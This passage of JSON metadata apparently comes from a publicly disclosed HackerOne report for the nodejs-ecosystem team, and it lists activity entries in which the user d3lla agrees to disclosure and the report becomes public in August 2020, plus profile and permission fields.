        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8986383,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-20T09:08:23.357Z",
      "updated_at": "2020-08-20T09:08:23.357Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    },
    {
      "id": 8986384,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-08-20T09:08:23.444Z",
      "updated_at": "2020-08-20T09:08:23.444Z",
      "actor": {
        "username": "d3lla",
        "cleared": false,
        "verified": false,
        "url": "/d3lla",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "nodejs-ecosystem"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}